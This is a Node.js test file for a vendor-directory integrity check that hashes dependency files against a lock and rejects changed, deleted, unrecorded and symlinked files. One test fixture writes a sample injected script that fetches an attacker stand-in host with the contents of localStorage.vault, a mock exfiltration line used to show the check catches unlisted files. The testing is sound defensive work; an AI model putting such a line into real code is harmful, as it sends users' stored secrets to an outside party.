// The /vendor integrity check (dependency plan item 4).
//
// The point of these tests is that the check REJECTS things. A lock verifier
// that only ever passes is indistinguishable from no verifier at all, so every
// tampering mode gets its own case: a changed byte, a deleted file, and — the
// one that is easy to forget — a file that is on disk but not in the lock,
// which serveFrom would happily hand to a browser.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { hashVendorTree, verifyVendorTree, describeVendorFailure } from '../vendor-integrity.js';

function fixture() {
  const dir = mkdtempSync(join(tmpdir(), 'vendor-integrity-'));
  mkdirSync(join(dir, 'pkg', 'nested'), { recursive: true });
  writeFileSync(join(dir, 'pkg', 'index.js'), 'export const a = 1;\n');
  writeFileSync(join(dir, 'pkg', 'nested', 'deep.js'), 'export const b = 2;\n');
  return { dir, roots: { pkg: join(dir, 'pkg') } };
}

test('hashes every file in the tree, including nested ones', () => {
  const { dir, roots } = fixture();
  const tree = hashVendorTree(roots);
  assert.deepEqual(Object.keys(tree).sort(), ['pkg/index.js', 'pkg/nested/deep.js']);
  // Pin the actual sha256 of the known content, so swapping the digest
  // algorithm (or hashing the path instead of the bytes) fails here.
  assert.equal(tree['pkg/index.js'], '037ecd1db38c230c248787e60fd7bfc0cb0101b187b59535b6e7483be762d350');
  rmSync(dir, { recursive: true, force: true });
});

test('a clean tree verifies against its own lock', () => {
  const { dir, roots } = fixture();
  const result = verifyVendorTree(roots, hashVendorTree(roots));
  assert.equal(result.ok, true);
  assert.deepEqual([result.changed, result.missing, result.unexpected], [[], [], []]);
  rmSync(dir, { recursive: true, force: true });
});

test('rejects a single changed byte', () => {
  const { dir, roots } = fixture();
  const lock = hashVendorTree(roots);
  writeFileSync(join(dir, 'pkg', 'index.js'), 'export const a = 2;\n'); // 1 → 2
  const result = verifyVendorTree(roots, lock);
  assert.equal(result.ok, false);
  assert.deepEqual(result.changed, ['pkg/index.js']);
  rmSync(dir, { recursive: true, force: true });
});

test('rejects a deleted file', () => {
  const { dir, roots } = fixture();
  const lock = hashVendorTree(roots);
  rmSync(join(dir, 'pkg', 'nested', 'deep.js'));
  const result = verifyVendorTree(roots, lock);
  assert.equal(result.ok, false);
  assert.deepEqual(result.missing, ['pkg/nested/deep.js']);
  rmSync(dir, { recursive: true, force: true });
});

test('rejects an ADDED file the lock never recorded', () => {
  // serveFrom serves anything under the root, so an unrecorded file is servable
  // code. This is the case a naive "every locked file still matches" check misses.
  const { dir, roots } = fixture();
  const lock = hashVendorTree(roots);
  writeFileSync(join(dir, 'pkg', 'injected.js'), 'fetch("https://evil.example/" + localStorage.vault);\n');
  const result = verifyVendorTree(roots, lock);
  assert.equal(result.ok, false);
  assert.deepEqual(result.unexpected, ['pkg/injected.js']);
  rmSync(dir, { recursive: true, force: true });
});

test('does not follow symlinks out of the tree', () => {
  // Following one would hash bytes the lock cannot govern — and would let a
  // link swap the served content without changing anything inside the root.
  const { dir, roots } = fixture();
  writeFileSync(join(dir, 'outside.js'), 'export const evil = true;\n');
  symlinkSync(join(dir, 'outside.js'), join(dir, 'pkg', 'link.js'));
  const tree = hashVendorTree(roots);
  assert.ok(!('pkg/link.js' in tree), 'symlink must not be hashed as a tree member');
  rmSync(dir, { recursive: true, force: true });
});

test('failure description names the paths and caps the list', () => {
  const changed = Array.from({ length: 25 }, (_, i) => `pkg/f${i}.js`);
  const text = describeVendorFailure({ changed, missing: [], unexpected: [] });
  assert.match(text, /25 changed/);
  assert.match(text, /pkg\/f0\.js/);
  assert.match(text, /… and 15 more/);
});

test('the real shipped vendor.lock matches what is on disk right now', async () => {
  // Guards the committed lock itself: if a dependency changes without
  // `npm run vendor:lock`, this fails here rather than at boot in production.
  const { VENDOR_ROOTS } = await import('../server.js');
  const { readFileSync } = await import('node:fs');
  const lock = JSON.parse(readFileSync(new URL('../vendor.lock', import.meta.url), 'utf8'));
  const result = verifyVendorTree(VENDOR_ROOTS, lock);
  assert.equal(result.ok, true, `vendor.lock is stale — run npm run vendor:lock\n${describeVendorFailure(result)}`);
});
